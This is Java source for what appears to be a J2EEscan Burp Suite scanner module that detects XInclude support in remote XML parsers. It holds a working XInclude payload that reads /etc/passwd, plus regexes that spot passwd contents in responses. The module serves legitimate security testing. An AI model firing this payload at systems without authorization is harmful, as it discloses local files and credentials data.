package burp.j2ee.issues.impl;

import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IRequestInfo;
import burp.IScanIssue;
import burp.IScannerInsertionPoint;
import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;
import burp.j2ee.issues.IModule;

import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 *
 * This module detect remote XML library parser with support of XInclude
 * capability
 *
 * This vulnerability usually could lead to Local File Include issues
 */
public class XInclude implements IModule {

    private static final String TITLE = "XML Security - XInclude Support";
    private static final String DESCRIPTION = "J2EEscan verified XInclude functionality into the remote "
            + "XML parser; it's possible "
            + "to abuse this capability to execute LFI attacks."
            + "<br /><br />"
            + "<b>References</b>:<br /><br />"
            + "https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing<br />"
            + "http://vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf<br />";

    private static final String REMEDY = "It's reccomended to disable <pre>XInclude</pre> capability support.";
    
    private static final List<Pattern> XINCLUDE_REGEX = Arrays.asList(
            Pattern.compile("root:.*:0:[01]:", Pattern.CASE_INSENSITIVE | Pattern.DOTALL | Pattern.MULTILINE),
            Pattern.compile("file not found", Pattern.CASE_INSENSITIVE | Pattern.DOTALL | Pattern.MULTILINE),
            Pattern.compile("java\\.io\\.FileNotFoundException", Pattern.CASE_INSENSITIVE | Pattern.DOTALL | Pattern.MULTILINE));

    private static final List<byte[]> XINCLUDE_INJ_TESTS = Arrays.asList(
            "<xi:include href=\"file:///etc/passwd\" parse=\"text\"/>".getBytes());    
    
    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {

        IExtensionHelpers helpers = callbacks.getHelpers();
        List<IScanIssue> issues = new ArrayList<>();
        IRequestInfo reqInfo = callbacks.getHelpers().analyzeRequest(baseRequestResponse);
        URL curURL = reqInfo.getUrl();

        // Skip test if there is no XML request body
        if (IRequestInfo.CONTENT_TYPE_XML != reqInfo.getContentType()){
            return issues;
        }
        
         
        for (byte[] INJ_TEST : XINCLUDE_INJ_TESTS) {
            // make a request containing our injection test in the insertion point
            byte[] checkRequest = insertionPoint.buildRequest(INJ_TEST);
            IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(
                    baseRequestResponse.getHttpService(), checkRequest);

            String response = helpers.bytesToString(checkRequestResponse.getResponse());

            for (Pattern xincludeMatcher : XINCLUDE_REGEX) {

                Matcher matcher = xincludeMatcher.matcher(response);

                if (matcher.find()) {

                    issues.add(new CustomScanIssue(
                            baseRequestResponse.getHttpService(),
                            helpers.analyzeRequest(baseRequestResponse).getUrl(),
                            checkRequestResponse,
                            TITLE,
                            DESCRIPTION,
                            REMEDY,
                            Risk.Medium,
                            Confidence.Certain
                    ));

                    return issues;
                }
            }
        }
        
        return issues;
    }
}
